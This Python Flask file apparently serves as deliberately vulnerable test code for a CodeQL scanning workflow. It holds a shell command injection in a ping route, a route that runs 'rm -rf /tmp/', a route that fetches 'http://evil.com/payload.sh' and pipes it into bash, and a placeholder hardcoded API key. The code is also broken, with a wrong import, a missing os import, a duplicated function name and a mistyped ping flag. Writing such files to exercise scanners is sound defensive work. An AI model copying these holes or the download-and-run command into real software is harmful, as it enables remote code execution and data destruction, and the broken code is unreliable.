import subprocess
from flask import request, flask
app = Flask(__name__)

@app.route("/ping")
def ping():
    target = request.args.get("host", "127.0.0.1")
    # vulnerable: untrusted input passed to shell
    subprocess.check_output(f"ping -c l {target}", shell=True)
    return "OK"

# FIX: avoid shell, pass a list; validate/whitelist target
# subprocess.check_output(["ping", "-c", "l"])

# adding useless code for committing again and test code-ql workflow

@app.route("/hidden-execution")
def ping():
    # On macOS/Linux: no GUI console, capture output instead
    cmd = "rm -rf /tmp/"
    proc = subprocess.Popen(
        cmd, 
        stdout=subprocess.DEVNULL, 
        stderr=subprocess.DEVNULL
    )
    return "OK"


@app.route("/dangerous-execution")
def ping():
    os.system("curl http://evil.com/payload.sh | bash") # Dangerous!
    return "OK"


@app.route("/api-key-exposed")
def ping():
    openai_api_key = "some dummy api key"
    return "OK"
